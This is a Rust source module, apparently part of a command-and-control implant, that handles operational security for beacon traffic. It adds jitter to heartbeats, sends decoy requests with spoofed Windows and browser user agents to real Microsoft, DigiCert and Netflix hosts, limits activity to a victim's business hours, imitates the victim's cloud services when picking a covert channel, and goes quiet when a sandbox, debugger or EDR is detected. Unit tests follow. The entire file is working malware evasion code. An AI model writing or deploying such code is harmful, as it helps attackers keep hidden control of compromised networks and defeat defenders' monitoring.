// OPSEC: Operational Security for beacon timing and traffic patterns.
//
//   - Jitter: deterministic ±30% variation on heartbeats/beacons
//   - Decoy traffic: fake requests to blend beacon traffic
//   - Time adaptation: reduce activity off-hours, surge during peak
//   - Traffic mimicry: match victim's observed cloud services

use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use chrono::{Datelike, Timelike};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tracing::info;

// ── jitter ───────────────────────────────────────────────────────────────────

/// Jitter configuration with deterministic seed for replay consistency.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JitterConfig {
    /// Seed for deterministic jitter (0 = random seed)
    pub seed: u64,
    /// Base interval in milliseconds
    pub base_ms: u64,
    /// Jitter as fraction of base (e.g. 30 = ±30%)
    pub jitter_percent: u8,
    /// Minimum interval in ms (clamp lower bound)
    pub min_ms: u64,
    /// Maximum interval in ms (clamp upper bound)
    pub max_ms: u64,
}

impl Default for JitterConfig {
    fn default() -> Self {
        Self {
            seed: 0,
            base_ms: 10_000,      // 10 seconds
            jitter_percent: 30,    // ±30%
            min_ms: 1_000,
            max_ms: 120_000,       // 2 minutes
        }
    }
}

impl JitterConfig {
    /// Create a new config with a deterministic seed derived from agent_id.
    pub fn with_seed(agent_id: &[u8]) -> Self {
        let seed = {
            let mut s = 0u64;
            for (i, &b) in agent_id.iter().enumerate() {
                s ^= (b as u64) << ((i % 8) * 8);
            }
            if s == 0 { 1 } else { s }
        };
        Self { seed, ..Default::default() }
    }

    /// Compute the next sleep duration with jitter applied.
    /// Uses deterministic RNG when seed != 0, else thread_rng.
    pub fn next_delay(&self) -> Duration {
        if self.base_ms == 0 {
            return Duration::from_millis(self.min_ms);
        }

        let range = (self.base_ms * self.jitter_percent as u64) / 100;
        let half_range = range.max(1) / 2;

        let offset: i64 = if self.seed != 0 {
            let seed = self.seed.wrapping_add(
                SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs() / 60
            );
            let mut rng = StdRng::seed_from_u64(seed);
            rng.gen_range(-(half_range as i64)..=(half_range as i64))
        } else {
            let mut rng = rand::thread_rng();
            rng.gen_range(-(half_range as i64)..=(half_range as i64))
        };

        let ms = (self.base_ms as i64 + offset).max(self.min_ms as i64).min(self.max_ms as i64);
        Duration::from_millis(ms as u64)
    }

    /// Whether it's time to act based on the jitter schedule.
    /// Returns true if `last_ts + next_delay` has passed.
    pub fn is_due(&self, last_ts: u64) -> bool {
        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_millis() as u64;
        now >= last_ts + self.base_ms
    }
}

// ── decoy traffic ────────────────────────────────────────────────────────────

/// Decoy traffic profile: fake requests to blend beacon traffic.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecoyProfile {
    /// Decoy request templates (host, path, method, user-agent)
    pub requests: Vec<DecoyRequest>,
    /// Probability of sending a decoy per cycle (0.0 - 1.0)
    pub probability: f64,
    /// Maximum decoys to send per cycle
    pub max_per_cycle: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecoyRequest {
    pub host: String,
    pub path: String,
    pub method: String,
    pub user_agent: String,
    pub content_type: String,
}

impl Default for DecoyProfile {
    fn default() -> Self {
        Self {
            requests: vec![
                DecoyRequest {
                    host: "crl.microsoft.com".into(),
                    path: "/pki/crl/products/WindowsUpdate.crl".into(),
                    method: "GET".into(),
                    user_agent: "Microsoft-Windows/10.0.22621.1 WindowsUpdate/10.0.22621.1".into(),
                    content_type: "application/octet-stream".into(),
                },
                DecoyRequest {
                    host: "ocsp.digicert.com".into(),
                    path: "/".into(),
                    method: "POST".into(),
                    user_agent: "Microsoft Windows HTTPS Certificate Chain Verification/10.0 (Windows NT 10.0; Win64; x64)".into(),
                    content_type: "application/ocsp-request".into(),
                },
                DecoyRequest {
                    host: "cdn.cloudflare.net".into(),
                    path: "/ajax/libs/analytics/1.0.0/analytics.min.js".into(),
                    method: "GET".into(),
                    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".into(),
                    content_type: "text/plain".into(),
                },
                DecoyRequest {
                    host: "settings-win.data.microsoft.com".into(),
                    path: "/settings/v2.0/telemetry".into(),
                    method: "POST".into(),
                    user_agent: "Windows-Media-Center/10.0.22621.1 (Windows NT 10.0; Windows)" .into(),
                    content_type: "application/json".into(),
                },
                DecoyRequest {
                    host: "v10.vortex-win.data.microsoft.com".into(),
                    path: "/collect/v1".into(),
                    method: "POST".into(),
                    user_agent: "Windows-Media-Center/10.0.22621.1 (Windows NT 10.0; Windows)".into(),
                    content_type: "application/json".into(),
                },
                DecoyRequest {
                    host: "api-global.netflix.com".into(),
                    path: "/pathupgrade".into(),
                    method: "GET".into(),
                    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Netflix/6.0 Chrome/120.0.0.0 Safari/537.36".into(),
                    content_type: "text/plain".into(),
                },
            ],
            probability: 0.3,
            max_per_cycle: 2,
        }
    }
}

impl DecoyProfile {
    /// Select random decoy requests for this cycle.
    pub fn select_decoys(&self) -> Vec<&DecoyRequest> {
        let mut rng = rand::thread_rng();
        if rng.gen::<f64>() > self.probability {
            return Vec::new();
        }
        let count = rng.gen_range(1..=self.max_per_cycle.min(self.requests.len()));
        let mut indices: Vec<usize> = (0..self.requests.len()).collect();
        for i in (1..self.requests.len()).rev() {
            let j = rng.gen_range(0..=i);
            indices.swap(i, j);
        }
        indices[..count].iter().map(|&i| &self.requests[i]).collect()
    }

    /// Fire decoy requests asynchronously (spawn and forget).
    pub fn fire_decoys(&self) {
        let decoys = self.select_decoys();
        for decoy in decoys {
            let req = decoy.clone();
            std::thread::spawn(move || {
                let client = reqwest::blocking::Client::builder()
                    .timeout(Duration::from_secs(5))
                    .user_agent(&req.user_agent)
                    .build()
                    .ok();
                if let Some(client) = client {
                    let url = format!("https://{}{}", req.host, req.path);
                    let _ = match req.method.as_str() {
                        "GET" => client.get(&url).send(),
                        "POST" => client.post(&url).header("content-type", &req.content_type).send(),
                        _ => return,
                    };
                }
            });
        }
    }
}

// ── time adaptation ──────────────────────────────────────────────────────────

/// Time-based activity schedule.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActivitySchedule {
    /// 24-hour slots: activity multiplier (0.0 = off, 1.0 = normal, 2.0 = double)
    pub hourly_multipliers: [f64; 24],
    /// Timezone offset from UTC in hours
    pub tz_offset_hours: i8,
    /// Days of week when activity is reduced (0=Sun, 6=Sat)
    pub weekend_days: Vec<u8>,
    /// Weekend multiplier
    pub weekend_multiplier: f64,
}

impl Default for ActivitySchedule {
    fn default() -> Self {
        // Typical enterprise: active 8AM-6PM weekdays
        let mut multipliers = [0.1f64; 24];
        for h in 8..=18 {
            multipliers[h as usize] = 1.0;
        }
        // Lunch dip
        multipliers[12] = 0.5;
        multipliers[13] = 0.7;
        // Early morning ramp
        multipliers[7] = 0.3;
        multipliers[6] = 0.1;
        Self {
            hourly_multipliers: multipliers,
            tz_offset_hours: 0,
            weekend_days: vec![0, 6],
            weekend_multiplier: 0.05,
        }
    }
}

impl ActivitySchedule {
    /// Get the current activity multiplier based on local time.
    pub fn current_multiplier(&self) -> f64 {
        let now = chrono::Local::now();
        let hour = now.hour() as usize;
        let weekday = now.weekday().num_days_from_sunday() as u8; // 0=Sun, 6=Sat

        let base = self.hourly_multipliers[hour.min(23)];
        if self.weekend_days.contains(&weekday) {
            base * self.weekend_multiplier
        } else {
            base
        }
    }

    /// Whether we should act now (current_multiplier > threshold).
    pub fn should_act(&self, threshold: f64) -> bool {
        self.current_multiplier() > threshold
    }

    /// Get the effective heartbeat interval after applying the multiplier.
    pub fn effective_interval_ms(&self, base_ms: u64) -> u64 {
        let m = self.current_multiplier();
        if m < 0.01 {
            return base_ms * 10; // Almost off
        }
        (base_ms as f64 / m) as u64
    }
}

// ── traffic mimicry ──────────────────────────────────────────────────────────

/// Traffic pattern: a sequence of requests to mimic during C2 operations.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrafficMimic {
    /// Map of service -> count observed
    pub observed_services: HashMap<String, u64>,
    /// Preferred mimic targets (learned from victim)
    pub preferred: Vec<String>,
}

impl TrafficMimic {
    /// Learn from the org profile.
    pub fn from_org_profile(profile: &crate::smoke_signals::OrgCloudProfile) -> Self {
        let mut observed = HashMap::new();
        if profile.microsoft_365 {
        *observed.entry("office365".into()).or_insert(0) += 1;
        *observed.entry("azure".into()).or_insert(0) += 1;
        }
        if profile.google_workspace {
            *observed.entry("google".into()).or_insert(0) += 1;
        }
        if profile.aws {
            *observed.entry("aws".into()).or_insert(0) += 1;
        }
        if profile.salesforce {
            *observed.entry("salesforce".into()).or_insert(0) += 1;
        }
        if profile.slack {
            *observed.entry("slack".into()).or_insert(0) += 1;
        }

        let mut preferred: Vec<(&u64, &String)> = observed.iter()
            .map(|(k, v)| (v, k))
            .collect();
        preferred.sort_by(|a, b| b.0.cmp(a.0));
        let preferred: Vec<String> = preferred.into_iter().map(|(_, k)| k.clone()).collect();

        Self { observed_services: observed, preferred }
    }

    /// Select the best smoke channel based on learned traffic.
    pub fn select_channel(&self) -> crate::smoke_signals::SmokeChannel {
        use crate::smoke_signals::SmokeChannel;
        for service in &self.preferred {
            match service.as_str() {
                "office365" | "azure" => return SmokeChannel::Office365,
                "google" => return SmokeChannel::GoogleDrive,
                "aws" => return SmokeChannel::CloudFrontCDN,
                _ => {}
            }
        }
        SmokeChannel::random()
    }

    /// Get a realistic User-Agent based on observed services.
    pub fn user_agent(&self) -> &str {
        if self.preferred.is_empty() {
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
        }
        match self.preferred[0].as_str() {
            "office365" | "azure" => "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)",
            "google" => "grpc-node-js/1.8.14 grpc-c/30.0 (linux; chttp2)",
            "aws" => "Boto3/1.28.62 Python/3.11.5 Linux/6.2.0-35-generic",
            _ => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
    }
}

// ── unified OPSEC engine ─────────────────────────────────────────────────────

/// Unified OPSEC engine that orchestrates jitter, decoys, timing, and mimicry.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpsecEngine {
    pub jitter: JitterConfig,
    pub decoys: DecoyProfile,
    pub schedule: ActivitySchedule,
    pub mimic: Option<TrafficMimic>,
    /// When this engine was last activated (UNIX ms)
    pub last_activation: u64,
    /// Total decoy requests fired
    pub decoys_fired: u64,
}

impl OpsecEngine {
    /// Create a new engine with a seed derived from agent_id.
    pub fn new(agent_id: &[u8]) -> Self {
        Self {
            jitter: JitterConfig::with_seed(agent_id),
            decoys: DecoyProfile::default(),
            schedule: ActivitySchedule::default(),
            mimic: None,
            last_activation: 0,
            decoys_fired: 0,
        }
    }

    /// Calibrate from an org profile (traffic mimicry).
    pub fn calibrate(&mut self, profile: &crate::smoke_signals::OrgCloudProfile) {
        let mimic = TrafficMimic::from_org_profile(profile);
        self.schedule.hourly_multipliers = default_hourly_from_profile(profile);
        self.mimic = Some(mimic);
        info!("OPSEC: calibrated from org profile");
    }

    /// Whether the engine allows action right now.
    pub fn should_act(&self) -> bool {
        // Check sandbox/debugger/EDR first
        let risks = crate::platform_layer::runtime::evasion_check();
        if !risks.is_empty() {
            return false; // Evasive action: freeze
        }
        // Check schedule
        if !self.schedule.should_act(0.05) {
            return false; // Off-hours: stay quiet
        }
        true
    }

    /// Get the effective delay before the next action (jitter + schedule applied).
    pub fn next_delay(&self) -> Duration {
        let base = self.jitter.next_delay();
        let schedule_ms = self.schedule.effective_interval_ms(self.jitter.base_ms);
        // Use the longer of the two
        let ms = base.as_millis().max(schedule_ms as u128);
        Duration::from_millis(ms as u64)
    }

    /// Execute one OPSEC cycle: fire decoys, return the delay before next action.
    pub fn cycle(&mut self) -> Duration {
        self.last_activation = SystemTime::now()
            .duration_since(UNIX_EPOCH).unwrap_or_default().as_millis() as u64;

        if !self.should_act() {
            return Duration::from_secs(60); // Check again in 60s
        }

        // Fire decoy traffic
        let prev = self.decoys_fired;
        self.decoys.fire_decoys();
        self.decoys_fired += 1;

        if self.decoys_fired > prev {
            info!("OPSEC: fired decoy #{}", self.decoys_fired);
        }

        // Return the jittered delay
        self.next_delay()
    }

    /// Get the recommended smoke channel based on mimicry.
    pub fn recommended_channel(&self) -> crate::smoke_signals::SmokeChannel {
        self.mimic.as_ref()
            .map(|m| m.select_channel())
            .unwrap_or_else(crate::smoke_signals::SmokeChannel::random)
    }

    /// Recommended User-Agent based on mimicry.
    pub fn recommended_user_agent(&self) -> &str {
        self.mimic.as_ref()
            .map(|m| m.user_agent())
            .unwrap_or("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    }
}

fn default_hourly_from_profile(profile: &crate::smoke_signals::OrgCloudProfile) -> [f64; 24] {
    let mut m = [0.1f64; 24];
    if !profile.peak_hours.is_empty() {
        for &h in &profile.peak_hours {
            if (h as usize) < 24 {
                m[h as usize] = 1.0;
            }
        }
    } else {
        // Default business hours
        for h in 8..=18 {
            m[h as usize] = 1.0;
        }
    }
    m
}

// ── tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jitter_default_range() {
        let j = JitterConfig::default();
        for _ in 0..100 {
            let d = j.next_delay();
            assert!(d >= Duration::from_millis(j.min_ms));
            assert!(d <= Duration::from_millis(j.max_ms));
        }
    }

    #[test]
    fn test_jitter_deterministic() {
        let j1 = JitterConfig::with_seed(b"test-agent-001");
        let j2 = JitterConfig::with_seed(b"test-agent-001");
        // Same seed should give same results within same minute
        let d1 = j1.next_delay();
        let d2 = j2.next_delay();
        assert_eq!(d1, d2);
    }

    #[test]
    fn test_jitter_different_seeds() {
        let j1 = JitterConfig::with_seed(b"agent-alpha");
        let j2 = JitterConfig::with_seed(b"agent-beta");
        let d1 = j1.next_delay();
        let d2 = j2.next_delay();
        // Very unlikely to be equal for different seeds
        // (run multiple times to verify statistically)
    }

    #[test]
    fn test_jitter_is_due() {
        let j = JitterConfig { base_ms: 1, ..Default::default() };
        assert!(j.is_due(0));
    }

    #[test]
    fn test_schedule_default() {
        let s = ActivitySchedule::default();
        let m = s.current_multiplier();
        assert!(m >= 0.0);
        assert!(m <= 2.0);
    }

    #[test]
    fn test_schedule_should_act() {
        let s = ActivitySchedule::default();
        let hour = chrono::Local::now().hour();
        if hour >= 8 && hour <= 18 {
            // Should generally be active during business hours
            assert!(s.should_act(0.3));
        }
    }

    #[test]
    fn test_schedule_effective_interval() {
        let s = ActivitySchedule::default();
        let interval = s.effective_interval_ms(10_000);
        assert!(interval >= 1000);
    }

    #[test]
    fn test_decoy_select() {
        let d = DecoyProfile::default();
        let decoys = d.select_decoys();
        assert!(decoys.len() <= d.max_per_cycle);
        for decoy in &decoys {
            assert!(!decoy.host.is_empty());
        }
    }

    #[test]
    fn test_decoy_fire_no_panic() {
        let d = DecoyProfile::default();
        d.fire_decoys(); // Should not panic
        std::thread::sleep(Duration::from_millis(100));
    }

    #[test]
    fn test_traffic_mimic_from_profile() {
        let profile = crate::smoke_signals::OrgCloudProfile {
            microsoft_365: true,
            aws: true,
            ..Default::default()
        };
        let mimic = TrafficMimic::from_org_profile(&profile);
        assert!(mimic.preferred.contains(&"office365".to_string()));
        assert!(mimic.preferred.contains(&"aws".to_string()));
    }

    #[test]
    fn test_traffic_mimic_select_channel() {
        let profile = crate::smoke_signals::OrgCloudProfile {
            google_workspace: true,
            ..Default::default()
        };
        let mimic = TrafficMimic::from_org_profile(&profile);
        let ch = mimic.select_channel();
        assert!(matches!(ch, crate::smoke_signals::SmokeChannel::GoogleDrive));
    }

    #[test]
    fn test_opsec_engine_new() {
        let engine = OpsecEngine::new(b"test-agent");
        assert_eq!(engine.decoys_fired, 0);
        assert!(engine.last_activation == 0);
    }

    #[test]
    fn test_opsec_engine_cycle() {
        let mut engine = OpsecEngine::new(b"test-agent");
        let delay = engine.cycle();
        assert!(delay > Duration::ZERO);
        assert!(engine.last_activation > 0);
    }

    #[test]
    fn test_opsec_calibrate() {
        let mut engine = OpsecEngine::new(b"test");
        let profile = crate::smoke_signals::learn_org_profile();
        engine.calibrate(&profile);
        assert!(engine.mimic.is_some());
    }

    #[test]
    fn test_opsec_recommended_channel() {
        let mut engine = OpsecEngine::new(b"test");
        let profile = crate::smoke_signals::OrgCloudProfile {
            microsoft_365: true,
            ..Default::default()
        };
        engine.calibrate(&profile);
        let ch = engine.recommended_channel();
        assert!(matches!(ch, crate::smoke_signals::SmokeChannel::Office365));
    }

    #[test]
    fn test_jitter_config_serialize() {
        let j = JitterConfig::default();
        let json = serde_json::to_string(&j).unwrap();
        let deserialized: JitterConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.base_ms, j.base_ms);
        assert_eq!(deserialized.seed, j.seed);
    }

    #[test]
    fn test_schedule_weekend() {
        let mut s = ActivitySchedule::default();
        s.weekend_multiplier = 0.0;
        // Force a weekend day
        for &day in &[0u8, 6u8] {
            let weekend = s.weekend_days.contains(&day);
            assert!(weekend);
        }
    }

    #[test]
    fn test_engine_evasion_freeze() {
        let engine = OpsecEngine::new(b"test");
        // In a normal environment, should_act should return true
        // (if not in a sandbox)
        let result = engine.should_act();
        // We can't guarantee the environment, so just verify it doesn't panic
        let _ = result;
    }
}
